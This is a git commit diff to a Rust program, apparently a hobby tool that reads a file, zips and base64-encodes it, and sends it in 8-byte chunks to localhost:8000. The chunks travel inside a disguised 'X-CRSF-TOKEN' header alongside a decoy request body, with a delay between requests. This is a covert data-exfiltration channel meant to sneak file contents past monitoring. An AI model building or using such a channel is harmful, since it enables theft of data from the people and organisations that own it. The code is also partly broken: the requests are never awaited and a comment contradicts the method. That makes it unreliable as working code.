b5010a0b6f089f5b1e94137a541ae1a44c782954
jnowaczek <jnowaczek@users.noreply.github.com>
2020-01-27 15:20:35 -0600

    This should be working?

--- src/main.rs
+++ src/main.rs
@@ -1,8 +1,11 @@
-use std::env;
+use std::{env, time};
 use std::fs::File;
 use std::path::PathBuf;
 use std::io::Read;
-use http::{header, request, response};
+
+use hyper::{Body, Client, Method, Request};
+
+const REQUEST_URL: &str = "0.0.0.0:8000";
 
 fn load_payload(payload: &PathBuf) -> std::io::Result<Vec<u8>> {
     let mut file = File::open(&payload)?;
@@ -13,7 +16,7 @@ fn load_payload(payload: &PathBuf) -> std::io::Result<Vec<u8>> {
     Ok(buffer)
 }
 
-fn encode_payload(filename: &str, payload_buffer: &Vec<u8>) -> zip::result::ZipResult<Vec<u8>> {
+fn encode_payload(filename: &str, payload_buffer: &Vec<u8>) -> std::io::Result<String> {
     use std::io::Write;
 
     let buf: &mut [u8] = &mut [0u8; 1024];
@@ -25,7 +28,26 @@ fn encode_payload(filename: &str, payload_buffer: &Vec<u8>) -> zip::result::ZipR
     zip.write(payload_buffer)?;
 
     // Optionally finish the zip. (this is also done on drop)
-    Ok(zip.finish().unwrap().into_inner().to_vec())
+    let zipped = zip.finish().unwrap().into_inner().to_vec();
+    Ok(base64::encode_config(&zipped, base64::URL_SAFE))
+}
+
+fn make_requests(payload: String, delay: u64,) {
+    for chunk in payload.as_bytes().chunks(8) {
+        let request = Request::builder()
+            .method(Method::GET)
+            .uri("http://localhost:8000/")
+            .header("X-CRSF-TOKEN", chunk)
+            .body(Body::from(r#"cheeky nando's"#))
+            .expect("blah");
+
+        let client = Client::new();
+
+        // POST it...
+        let _resp = client.request(request);
+
+        std::thread::sleep(time::Duration::from_millis(delay));
+    }
 }
 
 fn print_help() {
@@ -42,7 +64,10 @@ fn main() {
             let payload_path: &PathBuf = &PathBuf::from(&args[1]);
             let buffer: Vec<u8> = load_payload(payload_path).unwrap();
 
-            println!("Zipped file: {:?}", encode_payload(&args[1], &buffer).unwrap());
+            let zipped: String = encode_payload(&args[1], &buffer).unwrap();
+
+            println!("Zipped file: {:?}", zipped);
+            make_requests(zipped, 100);
         }
         _ => {
             print_help();
